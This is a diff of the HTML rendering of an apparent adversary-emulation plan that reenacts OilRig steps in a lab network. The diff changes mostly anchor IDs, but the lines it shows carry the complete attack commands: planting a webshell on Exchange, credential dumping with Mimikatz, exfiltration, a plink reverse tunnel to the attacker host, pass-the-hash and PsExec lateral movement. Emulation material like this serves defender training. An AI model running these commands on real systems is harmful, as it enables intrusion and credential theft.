+and <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L81">SideTwist.cpp#L81</a> -&gt; <a href="..//Resources/SideTwist/SideTwist/comms.cpp#L113-L124" class="outbound" target="_blank"><span>comms.cpp#L113-L12</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> -&gt; <a href=".././resources/sidetwist/sidetwist/comms.cpp#L172-L294">comms.cpp#L172-L2</a></li>
 </ul>
 <br>
 <ul>
@@ -576,9 +579,9 @@ and <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L81">SideTwist.cpp#L
 <li>VALUEVAULT opens Windows Vault: <a href="../resources/valuevault/vendor/vault/vault.go#L91-L97">vault.go#L91-L97</a></li>
 </ul>
 <br>
-<doc-anchor-target id="cited-intelligence">
+<doc-anchor-target id="microscope-cited-intelligence-2">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microscope-cited-intelligence-2">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
     </h3>
 </doc-anchor-target>
@@ -594,9 +597,9 @@ and <a href="../resources/sidetwist/sidetwist/sidetwist.cpp#L81">SideTwist.cpp#L
         <span>Step 4 - Install Web Shell on EWS</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track-4">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track-4">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
@@ -607,31 +610,31 @@ via <code v-pre>SystemFailureReporter.exe</code>; TWOFACE is then copied from <c
 <p>OilRig covers their tracks by deleting the webshell from <code v-pre>gosta</code>&#x27;s user
 directory on <code v-pre>THEBLOCK</code>.</p>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures-4">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures-4">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
 <p>The webshell is first placed on THEBLOCK (10.1.0.5) to prepare for copying via
 SMB to WATERFALLS.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '102 C:\Users\Public\contact.aspx|contact.aspx'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '102 C:\Users\Public\contact.aspx|contact.aspx'</code></pre>
 </doc-codeblock></div>
 <p>Once in place, OilRig has copied the webshell directly into the Exchange Web
 Services directory.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 copy C:\Users\Public\contact.aspx &quot;\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\&quot;'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 copy C:\Users\Public\contact.aspx &quot;\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\&quot;'</code></pre>
 </doc-codeblock></div>
 <p>Set the file hidden attribute on WATERFALLS and delete the webshell from
 THEBLOCK using SideTwist</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 attrib +h &quot;\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx&quot; &amp; del C:\Users\Public\contact.aspx'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 attrib +h &quot;\\10.1.0.6\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx&quot; &amp; del C:\Users\Public\contact.aspx'</code></pre>
 </doc-codeblock></div>
 <br>
-<doc-anchor-target id="source-code">
+<doc-anchor-target id="moyai-source-code-3">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#moyai-source-code-3">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
     </h3>
 </doc-anchor-target>
@@ -639,9 +642,9 @@ THEBLOCK using SideTwist</p>
 <li>TwoFace Webshell: <a href="../resources/twoface/">TwoFace</a></li>
 </ul>
 <br>
-<doc-anchor-target id="cited-intelligence">
+<doc-anchor-target id="microscope-cited-intelligence-3">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microscope-cited-intelligence-3">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
     </h3>
 </doc-anchor-target>
@@ -655,9 +658,9 @@ THEBLOCK using SideTwist</p>
         <span>Step 5 - EWS Discovery</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track-5">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track-5">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
@@ -669,25 +672,25 @@ network connections.</p>
 <p>Output of the system network connections discovery indicates an open connection
 to <code v-pre>10.1.0.7</code> via a port commonly associated with SQL.</p>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures-5">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures-5">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
 <p>On Linux Attack Platform box, change directories to the TwoFace payload folder:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">cd /opt/oilrig/Resources/payloads/TwoFace</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">cd /opt/oilrig/Resources/payloads/TwoFace</code></pre>
 </doc-codeblock></div>
 <p>Use the webshell to enumerate the current user.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has run whoami on a victim.[3][4][10]
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has run whoami on a victim.[3][4][10]
 
 curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=whoami&quot; https://10.1.0.6/ews/contact.aspx</code></pre>
 </doc-codeblock></div>
 <p>Enumerate the system network configurations.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has run ipconfig /all on a victim.[3][4]
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has run ipconfig /all on a victim.[3][4]
 
 curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=ipconfig /all&quot; https://10.1.0.6/ews/contact.aspx</code></pre>
 </doc-codeblock></div>
@@ -695,14 +698,14 @@ curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --dat
 discovering a connection to host 10.1.0.7 via a port commonly associated with
 SQL.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has used netstat -an on a victim to get a listing of network connections.[3]
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has used netstat -an on a victim to get a listing of network connections.[3]
 
 curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=netstat -an&quot; https://10.1.0.6/ews/contact.aspx</code></pre>
 </doc-codeblock></div>
 <br>
-<doc-anchor-target id="source-code">
+<doc-anchor-target id="moyai-source-code-4">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#moyai-source-code-4">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
     </h3>
 </doc-anchor-target>
@@ -711,9 +714,9 @@ curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --dat
 <li>TwoFace Webshell command execution: <a href="../resources/twoface/contact.aspx#L176-L194/">contact.aspx#L176-L194</a></li>
 </ul>
 <br>
-<doc-anchor-target id="cited-intelligence">
+<doc-anchor-target id="microscope-cited-intelligence-4">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microscope-cited-intelligence-4">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
     </h3>
 </doc-anchor-target>
@@ -728,9 +731,9 @@ curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --dat
         <span>Step 6 - Privileged Credential Dumping</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track-6">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track-6">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
@@ -740,40 +743,40 @@ and using elevated privileges to dump credentials. The dumped credentials
 <p>After exfiltration is complete OilRig deletes both Mimikatz and the dumped
 credentials from the directory on <code v-pre>WATERFALLS</code>.</p>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures-6">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures-6">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
 <p>Download Mimikatz to <code v-pre>WATERFALLS (10.1.0.6)</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F &quot;upl=f1&quot; -F 'sav=C:\Windows\temp\' -F &quot;vir=false&quot; -F &quot;nen=m64.exe&quot; -F 'f1=@m64.exe' https://10.1.0.6/EWS/contact.aspx</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F &quot;upl=f1&quot; -F 'sav=C:\Windows\temp\' -F &quot;vir=false&quot; -F &quot;nen=m64.exe&quot; -F 'f1=@m64.exe' https://10.1.0.6/EWS/contact.aspx</code></pre>
 </doc-codeblock></div>
 <p>Dump credentials using Mimikatz. Output includes creds for SQL server
 administrator <code v-pre>tous</code>.</p>
 <p><span class="docs-emoji">&#x1F4A1;</span> <code v-pre>privilege::debug</code> has been included here to match the CTI, but is
 unnecessary due to the webshell running as SYSTEM.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=C:\Windows\Temp\m64.exe privilege::debug sekurlsa::logonPasswords exit 1&gt; C:\Windows\Temp\01.txt&quot; https://10.1.0.6/ews/contact.aspx</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=C:\Windows\Temp\m64.exe privilege::debug sekurlsa::logonPasswords exit 1&gt; C:\Windows\Temp\01.txt&quot; https://10.1.0.6/ews/contact.aspx</code></pre>
 </doc-codeblock></div>
 <p>Exfiltrate the resulting output file <code v-pre>01.txt</code> to the attacker platform.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -o 01.txt --data 'don=c:\windows\temp\01.txt' https://10.1.0.6/EWS/contact.aspx</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -o 01.txt --data 'don=c:\windows\temp\01.txt' https://10.1.0.6/EWS/contact.aspx</code></pre>
 </doc-codeblock></div>
 <p>Display the contents of <code v-pre>01.txt</code> in the terminal window.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">cat 01.txt</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">cat 01.txt</code></pre>
 </doc-codeblock></div>
 <p>Clean up on <code v-pre>WATERFALLS</code> by removing the binary and output file from
 <code v-pre>C:\Windows\Temp\</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=del C:\windows\temp\01.txt C:\windows\temp\m64.exe&quot; https://10.1.0.6/EWS/contact.aspx</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST --data &quot;pro=cmd.exe&quot; --data &quot;cmd=del C:\windows\temp\01.txt C:\windows\temp\m64.exe&quot; https://10.1.0.6/EWS/contact.aspx</code></pre>
 </doc-codeblock></div>
 <br>
-<doc-anchor-target id="source-code">
+<doc-anchor-target id="moyai-source-code-5">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#moyai-source-code-5">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
     </h3>
 </doc-anchor-target>
@@ -788,9 +791,9 @@ unnecessary due to the webshell running as SYSTEM.</p>
 <li>Mimikatz: <a href="../resources/mimikatz/">Mimikatz</a></li>
 </ul>
 <br>
-<doc-anchor-target id="cited-intelligence">
+<doc-anchor-target id="microscope-cited-intelligence-5">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microscope-cited-intelligence-5">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
     </h3>
 </doc-anchor-target>
@@ -804,9 +807,9 @@ unnecessary due to the webshell running as SYSTEM.</p>
         <span>Step 7 - Lateral Movement to EWS via RDP Tunnel</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track-7">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track-7">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
@@ -816,41 +819,41 @@ accomplished with a remote port forward using the plink command line tool
 from <code v-pre>THEBLOCK (10.1.0.5)</code> to the attacking machine to allow RDP access through
 port 3389 as user <code v-pre>gosta</code>.</p>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures-7">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures-7">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
 <p>Download plink to <code v-pre>THEBLOCK (10.1.0.5)</code> using SideTwist and start plink tunnel
 to gain RDP access to <code v-pre>WATERFALLS (10.1.0.6)</code> from the Linux Attack Platform.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '102 c:\users\public\downloads\plink.exe|plink.exe'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '102 c:\users\public\downloads\plink.exe|plink.exe'</code></pre>
 </doc-codeblock></div>
 <p>Execute the remote port forward command using SideTwist. Note: this SideTwist
 process will persist as long as the tunnel is open and as such will need to be
 closed after the activity is done. SideTwist will continue to execute
 via schtask so other commands can be issued to the implant if needed.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 echo y | c:\users\public\downloads\plink.exe -ssh -N -R 192.168.0.4:13389:10.1.0.6:3389 -l saka -pw &quot;$ceKa#zU$Uc4^9yZ&quot; 192.168.0.4'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 echo y | c:\users\public\downloads\plink.exe -ssh -N -R 192.168.0.4:13389:10.1.0.6:3389 -l saka -pw &quot;$ceKa#zU$Uc4^9yZ&quot; 192.168.0.4'</code></pre>
 </doc-codeblock></div>
 <p>Ensure that the tunnel is open and listening on port 13389 on Linux Attack Platform.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">netstat -antulp | grep 13389</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">netstat -antulp | grep 13389</code></pre>
 </doc-codeblock></div>
 <p>You should see a result that looks like the following:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">tcp        0      0 127.0.0.1:13389         0.0.0.0:*               LISTEN</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">tcp        0      0 127.0.0.1:13389         0.0.0.0:*               LISTEN</code></pre>
 </doc-codeblock></div>
 <p>RDP to <code v-pre>WATERFALLS (10.1.0.6)</code> as user Gosta from Linux Attack Platform using the SSH
 tunnel.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">xfreerdp /u:'boombox\gosta' /p:'d0ntGoCH4$ingW8trfalls' /v:localhost:13389</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">xfreerdp /u:'boombox\gosta' /p:'d0ntGoCH4$ingW8trfalls' /v:localhost:13389</code></pre>
 </doc-codeblock></div>
 <br>
-<doc-anchor-target id="source-code">
+<doc-anchor-target id="moyai-source-code-6">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#moyai-source-code-6">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
     </h3>
 </doc-anchor-target>
@@ -858,9 +861,9 @@ tunnel.</p>
 <li>Plink command line tool: <a href="../resources/plink/">Plink</a></li>
 </ul>
 <br>
-<doc-anchor-target id="cited-intelligence">
+<doc-anchor-target id="microscope-cited-intelligence-6">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microscope-cited-intelligence-6">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
     </h3>
 </doc-anchor-target>
@@ -877,9 +880,9 @@ tunnel.</p>
         <span>Step 8 - Lateral Movement to the SQL Server</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track-8">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track-8">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
@@ -892,55 +895,55 @@ hash is executed to spawn a second shell as <code v-pre>tous</code> on <code v-p
 As <code v-pre>tous</code>, RDAT is copied over to <code v-pre>ENDOFROAD (10.1.0.7)</code>, then PsExec is executed
 to get a shell on <code v-pre>ENDOFROAD (10.1.0.7)</code></p>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures-8">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures-8">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
 <p>Download psexec to <code v-pre>WATERFALLS (10.1.0.6)</code> as <code v-pre>C:\Windows\System32\ps.exe</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has downloaded PsExec as ps.exe
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has downloaded PsExec as ps.exe
 
 curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F &quot;upl=f1&quot; -F 'sav=C:\Windows\System32' -F &quot;vir=false&quot; -F &quot;nen=ps.exe&quot; -F 'f1=@PsExec.exe' https://10.1.0.6/ews/contact.aspx</code></pre>
 </doc-codeblock></div>
 <p>Download RDAT to <code v-pre>WATERFALLS (10.1.0.6)</code> as <code v-pre>Nt.dat</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as Nt.dat
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as Nt.dat
 
 curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F &quot;upl=f1&quot; -F 'sav=C:\Windows\Temp' -F &quot;vir=false&quot; -F &quot;nen=Nt.dat&quot; -F 'f1=@RDAT.exe' https://10.1.0.6/ews/contact.aspx</code></pre>
 </doc-codeblock></div>
 <p>Redownload Mimikatz to <code v-pre>WATERFALLS (10.1.0.6)</code> as <code v-pre>mom64.exe</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has saved Mimikatz to disk at mom64.exe
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has saved Mimikatz to disk at mom64.exe
 
 curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F &quot;upl=f1&quot; -F 'sav=C:\Windows\System32' -F &quot;vir=false&quot; -F &quot;nen=mom64.exe&quot; -F 'f1=@m64.exe' https://10.1.0.6/ews/contact.aspx</code></pre>
 </doc-codeblock></div>
 <p>In the RDP to <code v-pre>WATERFALLS (10.1.0.6)</code>, open a new Command Prompt as
 Administrator, click yes to the UAC prompt, and execute Mimikatz PTH for <code v-pre>tous</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has used Mimikatz
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has used Mimikatz
 
 C:\Windows\System32\mom64.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:tous /domain:BOOMBOX /ntlm:9b7ff4cc0878bee9f099a4a7dc7227c3&quot; &quot;exit&quot;</code></pre>
 </doc-codeblock></div>
 <p>In the new Command Prompt spawned by the Mimikatz pass the hash, copy RDAT to
 <code v-pre>ENDOFROAD (10.1.0.7)</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe
 
 copy C:\Windows\Temp\Nt.dat \\10.1.0.7\C$\ProgramData\</code></pre>
 </doc-codeblock></div>
 <p>In the new Command Prompt spawned by Mimikatz pass the hash, PsExec to the SQL
 server <code v-pre>ENDOFROAD (10.1.0.7)</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># OilRig has used PsExec [11]
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># OilRig has used PsExec [11]
 
 C:\Windows\System32\ps.exe \\10.1.0.7 cmd.exe</code></pre>
 </doc-codeblock></div>
 <br>
-<doc-anchor-target id="source-code">
+<doc-anchor-target id="moyai-source-code-7">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#moyai-source-code-7">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
     </h3>
 </doc-anchor-target>
@@ -953,9 +956,9 @@ C:\Windows\System32\ps.exe \\10.1.0.7 cmd.exe</code></pre>
 <li>RDAT backdoor: <a href="../resources/rdat/">RDAT</a></li>
 </ul>
 <br>
-<doc-anchor-target id="cited-intelligence">
+<doc-anchor-target id="microscope-cited-intelligence-7">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microscope-cited-intelligence-7">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
     </h3>
 </doc-anchor-target>
@@ -972,9 +975,9 @@ C:\Windows\System32\ps.exe \\10.1.0.7 cmd.exe</code></pre>
         <span>Step 9 - SQL Server Discovery</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="voice-track">
+<doc-anchor-target id="microphone-voice-track-9">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#microphone-voice-track-9">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
     </h3>
 </doc-anchor-target>
@@ -982,24 +985,24 @@ C:\Windows\System32\ps.exe \\10.1.0.7 cmd.exe</code></pre>
 by Mimikatz pass the hash and PSExec to perform discovery of the database backup
 files on the SQL server <code v-pre>ENDOFROAD (10.1.0.7)</code>.</p>
 <hr>
-<doc-anchor-target id="procedures">
+<doc-anchor-target id="-procedures-9">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#-procedures-9">#</doc-anchor-trigger>
         <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
     </h3>
 </doc-anchor-target>
 <p>Discover version of SQL server</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">dir &quot;C:\Program Files\Microsoft SQL Server\&quot;</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">dir &quot;C:\Program Files\Microsoft SQL Server\&quot;</code></pre>
 </doc-codeblock></div>
 <p>Discover SQL server database backup files</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">dir &quot;C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\&quot;</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">dir &quot;C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\&quot;</code></pre>
 </doc-codeblock></div>
 <br>
-<doc-anchor-target id="cited-intelligence">
+<doc-anchor-target id="microscope-cited-intelligence-8">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
